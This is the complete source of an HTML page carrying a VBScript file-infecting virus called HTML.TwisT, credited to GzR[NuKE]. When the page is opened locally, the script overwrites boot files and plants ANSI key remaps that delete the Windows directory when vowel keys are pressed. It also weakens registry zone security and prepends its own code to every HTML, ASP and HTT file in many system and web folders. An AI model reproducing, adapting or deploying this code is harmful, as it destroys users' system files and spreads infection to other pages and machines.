!--TwisT-->
<html><body>
<SCRIPT Language = "JavaScript">
<!--
var userAgent=navigator.appName;
	var userVer=navigator.appVersion;
	var agentInfo=userAgent.substring(0, 1);
	var agentVer=userVer.substring(0, 1);
 if(agentInfo == "M"){
 if  (agentVer =="4"){
}
}else {
alert("This Page Was Designed ONLY For IE4, \nPlease Install IE4 To View")
self.close()
}
//-->
</SCRIPT>
<script Language="VBScript"><!--
'HTML.TwisT
'by GzR[NuKE]
'A remix of VBS.Shine for HTML
'Thanks to CB, NVT, & Metaphase
On Error Resume Next
Randomize
if location.protocol = "file:" then
	if Int((2 * Rnd) + 1) = 1 then
	set configfile = FSO.CreateTextFile("c:\config.sys", True)
	configfile.WriteLine ""
	configfile.WriteLine "DEVICE=C:\Windows\Command\Ansi.sys"
	configfile.WriteLine ""
	configfile.Close
	set autofile = FSO.CreateTextFile("c:\autoexec.bat", True)
	autofile.WriteLine ""
	autofile.WriteLine "type c:\windows\ansi.txt"
	autofile.WriteLine ""
	autofile.Close
	set ansifile = FSO.CreateTextFile("c:\windows\ansi.txt", True)
ansifile.WriteLine "@ECHO ON"
	ansifile.WriteLine "["& chr(34) &"e;"& chr(34) &"md c:\§"& chr(34) &" & chr(34) & ";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34)
	ansifile.WriteLine "["& chr(34) &"a;"& chr(34) &"md c:\§"& chr(34) &" & chr(34) & ";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34)
	ansifile.WriteLine "["& chr(34) &"i;"& chr(34) &"md c:\§"& chr(34) &" & chr(34) & ";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34)
ansifile.WriteLine "["& chr(34) &"o;"& chr(34) &"md c:\§"& chr(34) &" & chr(34) & ";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34)
	ansifile.WriteLine "["& chr(34) &"u;"& chr(34) &"md c:\§"& chr(34) &" & chr(34) & ";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34)
	ansifile.WriteLine "["& chr(34) &"E;"& chr(34) &"md c:\§"& chr(34) &" & chr(34) & ";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34) 
ansifile.WriteLine "["& chr(34) &"A;"& chr(34) &"md c:\§"& chr(34) &" & chr(34) & ";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34)
	ansifile.WriteLine "["& chr(34) &"I;"& chr(34) &"md c:\§"& chr(34) &" & chr(34) & ";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34)
	ansifile.WriteLine "["& chr(34) &"O;"& chr(34) &"md c:\§"& chr(34) &" & chr(34) & ";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34)
ansifile.WriteLine "["& chr(34) &"U;"& chr(34) &"md c:\§"& chr(34) &" & chr(34) & ";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34)
	ansifile.Close
	end if
	Set WSHShell = CreateObject("WScript.Shell")
	Set FSO = CreateObject("Scripting.FileSystemObject")
	Set TxtRng = document.body.createTextRange()
	HP = Replace(location.href, "/", "\")
	HP = Replace(HP, "file:\\\", "")
	HP = FSO.GetParentFolderName(HP)
GetFolder HP
	GetFolder("C:\My Documents")
	GetFolder("C:\Windows\Desktop")
	GetFolder("C:\Windows\Web")
	GetFolder("C:\Windows\Web\Wallpaper")
	GetFolder("C:\Windows\Help")
	GetFolder("C:\Windows\Temp")
	GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
	GetFolder("C:\Program Files\Microsoft FrontPage\bin")
	GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
	GetFolder("C:\Winnt\Desktop")
	GetFolder("C:\Winnt")
	GetFolder("C:\Inetpub\wwwroot")
GetFolder("C:\Inetpub\wwwroot\myweb")
	GetFolder("C:\webshare\wwwroot")
	GetFolder("C:\webshare\wwwroot\myweb")
WSHShell.RegWrite"HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WSHShell.Regwrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet 
Settings\Zones\0\1201" , 0, "REG_DWORD"
end if
Sub InfectFile(InfectFileName)
	Set Gz = FSO.GetFile(InfectFileName)
	Set TxtStream = Gz.OpenAsTextStream(1)
FileContents = TxtStream.ReadAll
	TxtStream.close()
	Set Gz = FSO.GetFile(InfectFileName)
	Set TxtStream = Gz.OpenAsTextStream(2)
	TxtStream.Write("<!--TwisT-->" + Chr(13) + Chr(10))
	TxtStream.Write("<html><body>" + Chr(13) + Chr(10))
	TxtStream.Write(TxtRng.htmlText + Chr(13) + Chr(10))
	TxtStream.WriteLine "</body></html>"
	TxtStream.WriteLine FileContents
	TxtStream.close()
End Sub
Sub GetFolder(VxPath)
	On Error Resume Next
	if FSO.FolderExists(VxPath) then
Do
			Set FolderObj = FSO.GetFolder(VxPath)
			VxPath = FSO.GetParentFolderName(VxPath)
			Set fc = FolderObj.Files
			For each target in fc
				ExtType = lcase(FSO.GetExtensionName(target.Name))
				if ExtType = "htt" or ExtType = "asp" or ExtType = "htm" or ExtType = "html" then
					Set Gz =FSO.GetFile(target.path)
					Set TxtStream = Gz.OpenAsTextStream(1)
					if TxtStream.readline <> "<!--TwisT-->" then
						TxtStream.close()
Call InfectFile(target.path)
					else
						TxtStream.close
					end if
				end if
			next
		Loop While FolderObj.IsRootFolder = False
	end if
End Sub
--></script>
</body></html>
<html><body>
<font size="3" face="Arial"><p>
<strong>HTML.TwisT by GzR[NuKE]</strong>
</p></font>
</body></html>
